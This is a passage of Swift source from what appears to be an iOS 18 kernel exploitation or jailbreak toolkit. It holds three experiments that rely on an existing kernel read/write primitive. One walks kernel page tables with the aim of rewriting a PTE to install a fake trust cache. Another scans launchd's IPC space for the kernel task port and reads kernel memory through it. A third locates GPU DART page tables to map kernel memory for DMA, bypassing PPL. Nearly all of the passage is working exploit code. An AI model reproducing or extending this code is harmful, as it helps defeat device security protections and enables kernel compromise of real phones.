    /// 1. Find pmap_cs/trust_cache virtual address (known from KRW)
    /// 2. Walk L1→L2→L3 page tables to find the PTE
    /// 3. Read PTE to get physical page number
    /// 4. Try to WRITE PTE to point to PurpleGfxMem physical page
    /// 5. If write succeeds → kernel reads our fake trust cache!
    ///
    /// Risk: PPL protects page tables. Writing PTE will likely panic.
    /// But: we need to TEST if socket KRW can reach page table zone.
    private func expPTERemap(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 75: PTE Remap Attack\n"
        detail += "================================\n\n"
        
        // Step 1: Get kernel pmap (page table root)
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
        
        // Step 2: Find kernel_pmap address
        // kernel_pmap is a global variable in __DATA
        // On iOS 18.2 A12, it's at a known offset from kernel base
        // We can find it by reading the pmap pointer from our task struct
        
        let ourTask = ds_get_our_task()
        detail += "Our task: 0x\(String(format: "%llx", ourTask))\n"
        
        // task->map is at offset ~0x28, map->pmap is at offset ~0x48
        let vmMap = ds_kread64(ourTask + 0x28)
        detail += "VM map: 0x\(String(format: "%llx", vmMap))\n"
        
        // pmap is at different offset depending on iOS version
        // Try common offsets: 0x48, 0x40, 0x50
        var kernelPmap: UInt64 = 0
        let pmapOffsets: [UInt64] = [0x48, 0x40, 0x50, 0x58, 0x30]
        
        for off in pmapOffsets {
            let candidate = ds_kread64_safe(vmMap + off)
            // Valid pmap should be a kernel pointer (0xfffffff...)
            if candidate > 0xfffffff000000000 && candidate < 0xffffffffffffffff {
                // Verify: pmap->tte should also be a valid kernel pointer
                let tte = ds_kread64_safe(candidate + 0x08)
                if tte > 0xfffffff000000000 || (tte > 0x800000000 && tte < 0x900000000) {
                    kernelPmap = candidate
                    detail += "Found pmap at map+0x\(String(format: "%llx", off)): 0x\(String(format: "%llx", candidate))\n"
                    detail += "  TTB (translation table base): 0x\(String(format: "%llx", tte))\n"
                    break
                }
            }
        }
        
        guard kernelPmap != 0 else {
            detail += "Could not find kernel pmap\n"
            detail += "Tried offsets from vm_map: \(pmapOffsets.map { "0x\(String(format: "%x", $0))" }.joined(separator: ", "))\n"
            return ExperimentResult(name: "PTE Remap (Exp 75)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Read the translation table base register (TTBR)
        let ttbr = ds_kread64_safe(kernelPmap + 0x08)
        detail += "\nTTBR (page table root): 0x\(String(format: "%llx", ttbr))\n"
        
        // Note: TTBR might be a physical address on some configs
        // On A12, kernel page tables are in a PPL-protected region
        // Let's try to read L1 entries
        
        // Step 4: Walk page table for a KNOWN kernel address (our proc)
        let ourProc = ds_get_our_proc()
        detail += "\n=== Walking page table for proc (0x\(String(format: "%llx", ourProc))) ===\n"
        
        // L1 index: bits [47:30] (or [38:30] for 39-bit VA)
        // iOS uses 39-bit virtual addresses with 16KB pages (14-bit offset)
        // L1: bits [38:36] (3 bits, 8 entries) — wait, 16KB granule:
        // Actually iOS 18 A12 uses 16KB pages:
        //   L0: not used (48-bit only)
        //   L1: bits [47:36] → 4096 entries (but only 39-bit VA → bits [38:36] = 8 entries)
        //   L2: bits [35:25] → 2048 entries
        //   L3: bits [24:14] → 2048 entries
        //   Page offset: bits [13:0] → 16KB
        
        // For 16KB granule, 39-bit VA:
        // L1 index: (va >> 36) & 0x7  (3 bits)
        // L2 index: (va >> 25) & 0x7FF (11 bits)
        // L3 index: (va >> 14) & 0x7FF (11 bits)
        
        let va = ourProc
        let l1Idx = (va >> 36) & 0x7
        let l2Idx = (va >> 25) & 0x7FF
        let l3Idx = (va >> 14) & 0x7FF
        
        detail += "VA decomposition (16KB granule):\n"
        detail += "  L1 index: \(l1Idx)\n"
        detail += "  L2 index: \(l2Idx)\n"
        detail += "  L3 index: \(l3Idx)\n"
        detail += "  Page offset: 0x\(String(format: "%llx", va & 0x3FFF))\n\n"
        
        // Try to read L1 entry
        // TTBR might be physical or virtual — try both
        let l1EntryAddr = ttbr + l1Idx * 8
        let l1Entry = ds_kread64_safe(l1EntryAddr)
        detail += "L1 entry at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
        
        if l1Entry == 0 {
            detail += "L1 entry is 0 — TTBR might be physical address (not readable via KRW)\n"
            detail += "Page tables are likely in PPL-protected zone\n\n"
            
            // Try: TTBR as physical address, convert to virtual via physmap
            let gPhysBase: UInt64 = 0x800000000
            let gVirtBase: UInt64 = 0xfffffff000000000 + kernSlide
            
            if ttbr > gPhysBase && ttbr < gPhysBase + 0x400000000 {
                let ttbrVirt = ttbr &- gPhysBase &+ gVirtBase
                detail += "TTBR as phys → virt: 0x\(String(format: "%llx", ttbrVirt))\n"
                let l1FromPhysmap = ds_kread64_safe(ttbrVirt + l1Idx * 8)
                detail += "L1 via physmap: 0x\(String(format: "%llx", l1FromPhysmap))\n"
                
                if l1FromPhysmap != 0 {
                    detail += "✅ Page table readable via physmap!\n"
                }
            }
        } else {
            // L1 entry is valid! Decode it
            let l1Valid = (l1Entry & 0x1) != 0
            let l1Table = (l1Entry & 0x2) != 0
            let l1OutputAddr = l1Entry & 0x0000FFFFFFFFF000  // bits [47:12] for table
            
            detail += "  Valid: \(l1Valid), Table: \(l1Table)\n"
            detail += "  Output addr: 0x\(String(format: "%llx", l1OutputAddr))\n"
            
            if l1Valid && l1Table {
                // Read L2 entry
                let l2EntryAddr = l1OutputAddr + l2Idx * 8
                let l2Entry = ds_kread64_safe(l2EntryAddr)
                detail += "\nL2 entry at 0x\(String(format: "%llx", l2EntryAddr)): 0x\(String(format: "%llx", l2Entry))\n"
                
                if l2Entry != 0 {
                    let l2Valid = (l2Entry & 0x1) != 0
                    let l2Table = (l2Entry & 0x2) != 0
                    let l2OutputAddr = l2Entry & 0x0000FFFFFFFFF000
                    
                    detail += "  Valid: \(l2Valid), Table: \(l2Table)\n"
                    detail += "  Output addr: 0x\(String(format: "%llx", l2OutputAddr))\n"
                    
                    if l2Valid && l2Table {
                        // Read L3 entry (final page)
                        let l3EntryAddr = l2OutputAddr + l3Idx * 8
                        let l3Entry = ds_kread64_safe(l3EntryAddr)
                        detail += "\nL3 entry at 0x\(String(format: "%llx", l3EntryAddr)): 0x\(String(format: "%llx", l3Entry))\n"
                        
                        if l3Entry != 0 {
                            let l3Valid = (l3Entry & 0x1) != 0
                            let l3PhysPage = l3Entry & 0x0000FFFFFFFC0000  // 16KB aligned
                            let l3AP = (l3Entry >> 6) & 0x3  // Access permissions
                            
                            detail += "  Valid: \(l3Valid)\n"
                            detail += "  Physical page: 0x\(String(format: "%llx", l3PhysPage))\n"
                            detail += "  AP (access): \(l3AP) (\(l3AP == 0 ? "EL1 RW" : l3AP == 1 ? "RW" : l3AP == 2 ? "EL1 RO" : "RO"))\n"
                            
                            detail += "\n✅ PAGE TABLE WALK SUCCESSFUL!\n"
                            detail += "proc physical address: 0x\(String(format: "%llx", l3PhysPage | (va & 0x3FFF)))\n"
                            detail += "\nThis means we CAN read page tables via socket KRW!\n"
                            detail += "Next: walk page table for trust cache VA → get its PTE\n"
                            detail += "Then: try to WRITE PTE (will likely panic due to PPL)\n"
                            detail += "But: if write succeeds → we control trust cache mapping!\n"
                        }
                    }
                }
            }
        }
        
        let success = detail.contains("PAGE TABLE WALK SUCCESSFUL") || detail.contains("Page table readable via physmap")
        return ExperimentResult(name: "PTE Remap (Exp 75)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 76: Kernel Task Port via IPC Traverse
    
    /// Find kernel_task's task port in launchd's IPC space.
    /// Launchd (PID 1) has host_priv port which can get kernel task port.
    /// If we can find it via IPC traverse → call mach_vm_read → bypass PPL!
    ///
    /// Strategy:
    /// 1. Get launchd proc (PID 1) → task → itk_space → is_table
    /// 2. Enumerate IPC entries looking for kernel task port
    /// 3. Kernel task port's kobject points to kernel_task struct
    /// 4. From kernel_task → vm_map → can read any kernel VA
    ///
    /// Alternative: find host_priv port → call host_get_special_port(4)
    /// to get kernel task port legitimately from launchd context
    private func expKernelTaskPort(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 76: Kernel Task Port via IPC Traverse\n"
        detail += "==================================================\n\n"
        
        // Step 1: Find launchd's proc using existing procbypid() function
        let ourProc = ds_get_our_proc()
        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
        
        let launchdProc = procbypid(1)
        
        guard launchdProc != 0 else {
            detail += "❌ procbypid(1) returned 0 — launchd not found\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "Launchd proc: 0x\(String(format: "%llx", launchdProc))\n"
        let launchdPid = ds_kread32(launchdProc + UInt64(off_proc_p_pid))
        detail += "Launchd PID: \(launchdPid)\n\n"
        
        // Step 2: Get launchd's task
        // On iOS 18, task is accessed via proc_ro: proc→proc_ro→pr_task
        let launchdProcRo = ds_kread64_safe(launchdProc + UInt64(off_proc_p_proc_ro))
        detail += "Launchd proc_ro: 0x\(String(format: "%llx", launchdProcRo))\n"
        
        guard launchdProcRo != 0 else {
            detail += "❌ Cannot read launchd proc_ro\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        let launchdTask = ds_kread64_safe(launchdProcRo + UInt64(off_proc_ro_pr_task))
        detail += "Launchd task: 0x\(String(format: "%llx", launchdTask))\n"
        
        guard launchdTask != 0 else {
            detail += "❌ Cannot read launchd task\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Get IPC space from task
        let itkSpace = ds_kread64_safe(launchdTask + UInt64(off_task_itk_space))
        detail += "Launchd itk_space: 0x\(String(format: "%llx", itkSpace))\n"
        
        guard itkSpace != 0 else {
            detail += "❌ Cannot read itk_space\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 4: Get IPC table
        let ipcTable = ds_kread64_safe(itkSpace + UInt64(off_ipc_space_is_table))
        detail += "IPC table: 0x\(String(format: "%llx", ipcTable))\n"
        
        guard ipcTable != 0 else {
            detail += "❌ Cannot read IPC table\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 5: Enumerate IPC entries looking for kernel task port
        // Kernel task port's kobject should point to kernel_task
        // kernel_task is identifiable by: its vm_map covers all kernel VA space
        detail += "\n=== Enumerating launchd IPC ports ===\n"
        
        let entrySize: UInt64 = 0x18  // sizeof(ipc_entry) on arm64
        var kernelPort: UInt64 = 0
        var kernelPortName: UInt32 = 0
        var portsScanned = 0
        
        for i in 1..<512 {
            let entryAddr = ipcTable + UInt64(i) * entrySize
            let ieObject = ds_kread64_safe(entryAddr + UInt64(off_ipc_entry_ie_object))
            
            if ieObject == 0 { continue }
            portsScanned += 1
            
            // Read port's kobject (task port → points to task struct)
            let kobject = ds_kread64_safe(ieObject + UInt64(off_ipc_port_ip_kobject))
            
            if kobject == 0 { continue }
            
            // Check if this kobject looks like kernel_task
            // kernel_task's vm_map should cover the entire kernel VA range
            // Also: kernel_task->proc should be PID 0 (kernel_task)
            let taskMap = ds_kread64_safe(kobject + 0x28)  // task->map
            
            if taskMap != 0 && taskMap > 0xfffffff000000000 {
                // Read vm_map min/max to check if it's kernel map
                let mapMin = ds_kread64_safe(taskMap + 0x10)  // vm_map_min
                let mapMax = ds_kread64_safe(taskMap + 0x18)  // vm_map_max
                
                // Kernel map typically: min=0xfffffff000000000, max=0xffffffffffffffff
                if mapMin > 0xfffffff000000000 && mapMax > mapMin {
                    detail += "🎯 Port \(i): kobject=0x\(String(format: "%llx", kobject))\n"
                    detail += "   vm_map: 0x\(String(format: "%llx", taskMap))\n"
                    detail += "   map range: 0x\(String(format: "%llx", mapMin)) - 0x\(String(format: "%llx", mapMax))\n"
                    
                    if mapMax == 0xffffffffffffffff || mapMax > 0xfffffffe00000000 {
                        detail += "   ✅ THIS IS KERNEL TASK PORT!\n"
                        kernelPort = ieObject
                        kernelPortName = UInt32(i << 8) | 0x03
                        break
                    }
                }
            }
            
            if portsScanned > 256 { break }
        }
        
        detail += "\nScanned \(portsScanned) ports\n"
        
        if kernelPort != 0 {
            detail += "\n🎉🎉🎉 KERNEL TASK PORT FOUND! 🎉🎉🎉\n"
            detail += "Port object: 0x\(String(format: "%llx", kernelPort))\n"
            detail += "Port name: 0x\(String(format: "%x", kernelPortName))\n\n"
            
            // Step 6: Try to use kernel task port via mach_vm_read
            // From launchd context, call mach_vm_read_overwrite with kernel task port
            detail += "=== Attempting mach_vm_read via kernel task port ===\n"
            
            // mach_vm_read_overwrite(task_port, address, size, &data, &size)
            // We'll try to read gPhysBase from __DATA
            let targetAddr = 0xfffffff00a0e0000 &+ ds_get_kernel_slide() + 0x8000
            let readSize: UInt64 = 8
            let mem = rc.trojanMem
            
            // Setup output buffer
            rc[mem + 0x4000].setValue64(0)
            rc[mem + 0x4008].setValue64(readSize)
            
            // mach_vm_read_overwrite(kernel_task_port_name, target, size, output, &outsize)
            let mvmRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(kernelPortName),
                                            targetAddr,
                                            readSize,
                                            mem + 0x4000,
                                            mem + 0x4008)
            
            let readVal = rc[mem + 0x4000].value64()
            detail += "mach_vm_read_overwrite ret: \(mvmRet) (0=success)\n"
            detail += "Read value: 0x\(String(format: "%llx", readVal))\n"
            
            if mvmRet == 0 && readVal != 0 {
                detail += "\n⚡⚡⚡ KERNEL MEMORY READ VIA TASK PORT! ⚡⚡⚡\n"
                detail += "We can read PPL-protected memory!\n"
                detail += "Next: read gPhysBase/gVirtBase → find trust cache → FULL JAILBREAK!\n"
            } else {
                detail += "\nmach_vm_read failed (ret=\(mvmRet))\n"
                detail += "Kernel might have disabled task_for_pid for kernel_task\n"
                detail += "Or: port name is wrong (need to use send right)\n"
            }
        } else {
            detail += "\n❌ Kernel task port not found in launchd IPC space\n"
            detail += "Possible reasons:\n"
            detail += "1. Kernel task port not in launchd's IPC table\n"
            detail += "2. IPC entry offsets are wrong for iOS 18.2\n"
            detail += "3. kobject pointer needs PAC stripping\n"
            detail += "4. Need to check host_priv port instead\n"
        }
        
        let success = detail.contains("KERNEL TASK PORT FOUND") || detail.contains("KERNEL MEMORY READ")
        return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 78: DART PTE Probe — Pure KRW, No IOKit
    
    /// Experiment 78 v7: Find AGX DART page tables via pure kernel KRW
    ///
    /// CRITICAL LESSON: All IOKit calls (IOServiceMatching, IORegistryEntryCreateCFProperties,
    /// IOServiceOpen) trigger launchd callbacks → launchd crashes → initproc panic.
    /// Solution: ZERO IOKit calls. Use only ds_kread64/ds_kwrite64.
    ///
    /// Strategy (pure KRW):
    /// 1. Find IODARTMapper kernel object by scanning zone memory for vtable pattern
    ///    - IODARTMapper vtable is in IODARTFamily kext __TEXT (known range)
    ///    - Scan GEN0-GEN3 zone for objects whose first 8 bytes point to kext range
    /// 2. Read DART MMIO VA from IODARTMapper ivar (offset ~0x60-0x80)
    ///    - MMIO VA is in kernel IO mapping range (0xfffffff0... or similar)
    /// 3. Read TTBR[0][0] from MMIO+0x200 via ds_kread32
    /// 4. Convert TTBR PPN → PA → physmap VA → walk L1/L2 tables
    /// 5. Catalog IOVA→PA mappings, check DAPF constraints
    ///
    /// SAFE: No IOKit, no SpringBoard RC, no launchd involvement
    private func expDARTPTEProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 78 v7: DART PTE Probe (Pure KRW)\n"
        detail += "============================================\n\n"
        detail += "⚠️ NO IOKit calls — pure ds_kread64 only\n\n"
        
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        let physmap = PhysmapConstants.loadOrDefault()
        let gPhysBase = physmap.gPhysBase
        let gVirtBase = physmap.gVirtBase

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n"
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // Safety bounds — only read addresses in these ranges
        let safeZoneMin: UInt64 = 0xffffffdc00000000
        let safeZoneMax: UInt64 = 0xffffffe400000000
        // Kernel kext range (IODARTFamily vtable lives here)
        let kextMin: UInt64 = kernBase
        let kextMax: UInt64 = kernBase + 0x10000000  // 256MB covers all kexts
        // Kernel IO mapping range (DART MMIO mapped here)
        let ioMin: UInt64 = 0xfffffff020000000 &+ kernSlide
        let ioMax: UInt64 = 0xfffffff060000000 &+ kernSlide
        
        var confirmedDARTL1: UInt64 = 0
        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
        var dartMmioVA: UInt64 = 0
        var dartObjectAddr: UInt64 = 0
        
        // ============================================================
        // STEP 1: Find IODARTMapper kernel object via vtable scan
        //
        // IOKit objects in kernel zone memory have this layout:
        //   +0x00: vtable pointer → points into kext __TEXT (0xfffffff0...)
        //   +0x08: retain count (small integer)
        //   +0x10: IOService state flags
        //   ...
        //   +0x60-0x90: MMIO base VA (points into IO mapping range)
        //
        // IODARTMapper vtable is in IODARTFamily kext.
        // We scan GEN0-GEN3 zone for objects whose vtable points to kext range.
        // Then verify by checking if any ivar looks like an IO mapping VA.
        // ============================================================
        detail += "=== Step 1: Scan zone for IODARTMapper object ===\n"
        detail += "Looking for vtable in kext range: 0x\(String(format: "%llx", kextMin))-0x\(String(format: "%llx", kextMax))\n"
        detail += "Looking for MMIO ivar in IO range: 0x\(String(format: "%llx", ioMin))-0x\(String(format: "%llx", ioMax))\n\n"
        
        let ourProc = ds_get_our_proc()
        
        // Scan ±4MB around our proc (stays in same zone generation)
        let scanCenter = ourProc & ~UInt64(0xFFF)
        let scanStart = scanCenter &- 0x400000
        let scanEnd   = scanCenter &+ 0x400000
        
        detail += "Scan range: 0x\(String(format: "%llx", scanStart)) - 0x\(String(format: "%llx", scanEnd))\n"
        
        // Scan in 16-byte steps (IOKit objects are 16-byte aligned)
        var candidatesFound = 0
        
        for addr in stride(from: scanStart, to: scanEnd, by: 16) {
            guard addr >= safeZoneMin && addr < safeZoneMax else { continue }
            
            // Read potential vtable pointer
            let vtable = ds_kread64_safe(addr)
            
            // vtable must point into kext range
            guard vtable >= kextMin && vtable < kextMax else { continue }
            
            // Verify: vtable+0 should be a valid function pointer (also in kext range)
            let firstMethod = ds_kread64_safe(vtable)
            guard firstMethod >= kextMin && firstMethod < kextMax else { continue }
            
            // Now scan ivars at +0x40 to +0xC0 for MMIO VA
            var foundMmio: UInt64 = 0
            for ivarOff: UInt64 in stride(from: 0x40, to: 0xC0, by: 8) {
                let ivarAddr = addr + ivarOff
                guard ivarAddr >= safeZoneMin && ivarAddr < safeZoneMax else { continue }
                let ivar = ds_kread64_safe(ivarAddr)
                if ivar >= ioMin && ivar < ioMax {
                    foundMmio = ivar
                    break
                }
            }
            
            if foundMmio != 0 {
                candidatesFound += 1
                detail += "✅ Candidate at 0x\(String(format: "%llx", addr)):\n"
                detail += "   vtable=0x\(String(format: "%llx", vtable))\n"
                detail += "   MMIO VA=0x\(String(format: "%llx", foundMmio))\n"
                dartObjectAddr = addr
                dartMmioVA = foundMmio
                if candidatesFound >= 3 { break }  // take first good one
            }
        }
        
        detail += "\nCandidates found: \(candidatesFound)\n\n"
        
        // ============================================================
        // STEP 2: Read DART MMIO registers via KRW
        //
        // DART MMIO register layout (T8020/A12):
        //   +0x000: PARAMS1 — bits[27:24] = page_shift (12 for 4KB)
        //   +0x020: STREAM_COMMAND
        //   +0x034: STREAM_SELECT
        //   +0x040: ERROR status
        //   +0x060: CONFIG (bit[15] = LOCK)
        //   +0x0fc: STREAMS_ENABLE
        //   +0x100 + sid*4: TCR[sid] — bit[7]=TRANSLATE_ENABLE
        //   +0x200 + sid*16 + idx*4: TTBR[sid][idx] — bit[31]=VALID, bits[30:0]=PPN
        // ============================================================
        detail += "=== Step 2: Read DART MMIO registers ===\n"
        
        if dartMmioVA == 0 {
            // Fallback: try known A12 DART MMIO kernel VA
            // DART MMIO is mapped at a fixed offset from kernel base on A12
            // IODARTFamily maps it via ml_io_map during boot
            // Typical kernel IO mapping base: kernBase + ~0x1C000000
            // But this varies. Try scanning kernel __DATA for IO pointers.
            detail += "No DART object found via zone scan\n"
            detail += "Trying fallback: scan kernel __DATA for MMIO pointer\n\n"
            
            // Scan __DATA (safe region, below PPL at +0x8000)
            let dataBase = kernBase + 0x30dc000
            for off: UInt64 in stride(from: 0, to: 0x7000, by: 8) {
                let val = ds_kread64_safe(dataBase + off)
                if val >= ioMin && val < ioMax {
                    // Verify it looks like DART MMIO: PARAMS1 should have page_shift=12
                    let params1 = ds_kread32_safe(val)
                    let pageShift = (params1 >> 24) & 0xF
                    if pageShift == 12 || pageShift == 14 {
                        detail += "✅ DART MMIO via __DATA+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", val))\n"
                        detail += "   PARAMS1=0x\(String(format: "%08x", params1)) page_shift=\(pageShift)\n"
                        dartMmioVA = val
                        break
                    }
                }
            }
        }
        
        if dartMmioVA != 0 {
            detail += "DART MMIO VA: 0x\(String(format: "%llx", dartMmioVA))\n\n"
            
            // Read PARAMS1
            let params1 = ds_kread32_safe(dartMmioVA + 0x000)
            let pageShift = (params1 >> 24) & 0xF
            detail += "PARAMS1: 0x\(String(format: "%08x", params1)) (page_shift=\(pageShift))\n"
            
            // Read CONFIG
            let config = ds_kread32_safe(dartMmioVA + 0x060)
            let locked = (config >> 15) & 1
            detail += "CONFIG: 0x\(String(format: "%08x", config)) (locked=\(locked))\n"
            
            // Read STREAMS_ENABLE
            let streamsEn = ds_kread32_safe(dartMmioVA + 0x0fc)
            detail += "STREAMS_ENABLE: 0x\(String(format: "%08x", streamsEn))\n\n"
            
            // Read all TTBRs (4 SIDs × 4 TTBRs each)
            detail += "TTBR registers:\n"
            var validTTBRs: [(sid: Int, idx: Int, ppn: UInt64)] = []
            
            for sid in 0..<4 {
                for idx in 0..<4 {
                    let ttbrOff = UInt64(0x200 + sid * 16 + idx * 4)
                    let ttbrVal = ds_kread32_safe(dartMmioVA + ttbrOff)
                    if ttbrVal != 0 {
                        let valid = (ttbrVal >> 31) & 1
                        let ppn = UInt64(ttbrVal & 0x7FFFFFFF)
                        detail += "  TTBR[\(sid)][\(idx)] = 0x\(String(format: "%08x", ttbrVal))"
                        detail += " valid=\(valid) PPN=0x\(String(format: "%x", ppn))\n"
                        if valid == 1 && ppn >= 0x800000 && ppn < 0x900000 {
                            validTTBRs.append((sid: sid, idx: idx, ppn: ppn))
                        }
                    }
                }
            }
            
            detail += "\nValid TTBRs: \(validTTBRs.count)\n\n"
            
            // ============================================================
            // STEP 3: Walk L1→L2 tables from TTBR
            // TTBR PPN → L1 PA → physmap VA → read L1 entries
            // L1 entry → L2 PA → physmap VA → read L2 entries (leaf PTEs)
            // ============================================================
            if let firstTTBR = validTTBRs.first {
                detail += "=== Step 3: Walk L1→L2 from TTBR[\(firstTTBR.sid)][\(firstTTBR.idx)] ===\n"
                
                let l1PA = firstTTBR.ppn << 12
                let l1VA = l1PA &- gPhysBase &+ gVirtBase
                
                detail += "L1 PA: 0x\(String(format: "%llx", l1PA))\n"
                detail += "L1 VA (physmap): 0x\(String(format: "%llx", l1VA))\n\n"
                
                guard l1VA >= safeZoneMin && l1VA < safeZoneMax else {
                    detail += "⚠️ L1 VA outside safe zone — cannot walk\n"
                    detail += "L1 is in physmap region (0xffffffde...) — need extended bounds\n"
                    
                    // Try with extended bounds that include physmap region
                    let extMin: UInt64 = 0xffffffd000000000
                    let extMax: UInt64 = 0xffffffe500000000
                    
                    if l1VA >= extMin && l1VA < extMax {
                        detail += "L1 VA is in extended physmap range — attempting read\n"
                        let testRead = ds_kread64_safe(l1VA)
                        detail += "L1[0] test read: 0x\(String(format: "%llx", testRead))\n"
                        
                        if testRead != 0 && testRead & 1 == 1 {
                            confirmedDARTL1 = l1VA
                            detail += "✅ L1 readable! Walking entries...\n\n"
                            
                            for i in 0..<512 {
                                let entryAddr = l1VA + UInt64(i * 8)
                                let entry = ds_kread64_safe(entryAddr)
                                if entry == 0 { continue }
                                if entry & 1 == 1 {
                                    let l2PA = entry & 0x0000000FFFFFF000
                                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
                                    if i < 8 {
                                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
                                    }
                                    // Walk L2
                                    if l2VA >= extMin && l2VA < extMax {
                                        var l2Count = 0
                                        for j in 0..<512 {
                                            let l2e = ds_kread64_safe(l2VA + UInt64(j * 8))
                                            if l2e & 1 == 1 {
                                                let leafPA = l2e & 0x0000000FFFFFF000
                                                let iova = UInt64(i) << 21 | UInt64(j) << 12
                                                confirmedL2Entries.append((iova: iova, pa: leafPA))
                                                l2Count += 1
                                            }
                                        }
                                        if i < 4 { detail += "    L2 entries: \(l2Count)\n" }
                                    }
                                }
                            }
                        }
                    }
                    
                    if confirmedDARTL1 == 0 {
                        detail += "\nL1 not readable — DART tables in wired memory outside zone\n"
                        detail += "DART MMIO found ✅ — this is major progress!\n"
                        detail += "TTBR values read ✅ — we know L1 physical address\n"
                        detail += "Next: use physmap walk (exp 74 method) to read L1\n"
                    }
                    
                    // Still report MMIO success even if L1 walk failed
                    let success = dartMmioVA != 0
                    return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
                }
                
                // L1 VA is in safe zone — walk normally
                confirmedDARTL1 = l1VA
                var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
                
                for i in 0..<512 {
                    let entryAddr = l1VA + UInt64(i * 8)
                    guard entryAddr >= safeZoneMin && entryAddr < safeZoneMax else { continue }
                    let entry = ds_kread64_safe(entryAddr)
                    if entry == 0 { continue }
                    if entry & 1 == 1 {
                        l1ValidEntries.append((idx: i, entry: entry))
                        if l1ValidEntries.count <= 8 {
                            let l2PA = entry & 0x0000000FFFFFF000
                            detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
                        }
                    }
                }
                
                detail += "Valid L1 entries: \(l1ValidEntries.count)\n\n"
                
                // Walk L2 tables
                detail += "=== Step 4: Walk L2 tables ===\n"
                for (idx, entry) in l1ValidEntries.prefix(4) {
                    let l2PA = entry & 0x0000000FFFFFF000
                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
                    
                    let extMin: UInt64 = 0xffffffd000000000
                    let extMax: UInt64 = 0xffffffe500000000
                    guard l2VA >= extMin && l2VA < extMax else {
                        detail += "L1[\(idx)] → L2 VA 0x\(String(format: "%llx", l2VA)) out of range\n"
                        continue
                    }
                    
                    var l2Count = 0
                    for j in 0..<512 {
                        let l2Addr = l2VA + UInt64(j * 8)
                        let l2e = ds_kread64_safe(l2Addr)
                        if l2e & 1 == 1 {
                            l2Count += 1
                            let leafPA = l2e & 0x0000000FFFFFF000
                            let iova = UInt64(idx) << 21 | UInt64(j) << 12
                            confirmedL2Entries.append((iova: iova, pa: leafPA))
                            if l2Count <= 3 {
                                detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
                            }
                        }
                    }
                    detail += "  L1[\(idx)] → \(l2Count) valid L2 entries\n"
                }
            }
        } else {
            detail += "❌ DART MMIO VA not found\n"
            detail += "IODARTMapper object not in scanned zone range\n"
            detail += "DART object may be in wired memory (outside zone allocator)\n\n"
            detail += "Alternative: read DART MMIO VA from kernel __DATA globals\n"
            detail += "IODARTFamily stores DART instance pointer in __DATA\n"
        }
        
        detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
        
        // ============================================================
        // STEP 5: Analysis — DAPF constraints and next steps
        // ============================================================
        detail += "=== Step 5: Analysis ===\n"
        
        if dartMmioVA != 0 {
            detail += "✅ DART MMIO found at: 0x\(String(format: "%llx", dartMmioVA))\n"
        }
        if confirmedDARTL1 != 0 {
            detail += "✅ DART L1 table at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
        }
        detail += "IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
        
        if !confirmedL2Entries.isEmpty {
            let pas = confirmedL2Entries.map { $0.pa }
            let minPA = pas.min() ?? 0
            let maxPA = pas.max() ?? 0
            
            detail += "PA range: 0x\(String(format: "%llx", minPA)) - 0x\(String(format: "%llx", maxPA))\n"
            detail += "Range size: \((maxPA - minPA) / 1024 / 1024) MB\n\n"
            
            let kernDataPA = (kernBase + 0x30dc000) &- gVirtBase &+ gPhysBase
            let pplDataPA = kernDataPA + 0x8000
            detail += "Kernel __DATA PA: 0x\(String(format: "%llx", kernDataPA))\n"
            detail += "PPL data PA: 0x\(String(format: "%llx", pplDataPA))\n"
            
            let kernInRange = kernDataPA >= minPA && kernDataPA <= maxPA
            detail += "Kernel PA in DART range: \(kernInRange)\n\n"
            
            if kernInRange {
                detail += "⚡⚡⚡ KERNEL PA IN DART RANGE — GPU DMA VIABLE! ⚡⚡⚡\n"
            }
            
            let maxIOVA = confirmedL2Entries.map { $0.iova }.max() ?? 0
            detail += "Free IOVA: 0x\(String(format: "%x", maxIOVA + 0x1000)) - 0xFFFFFFFF\n"
            detail += "\n🎯 NEXT: Write DART PTE at free IOVA → map target PA → GPU DMA\n"
        } else if dartMmioVA != 0 {
            detail += "DART MMIO readable but L1 tables not in zone range\n"
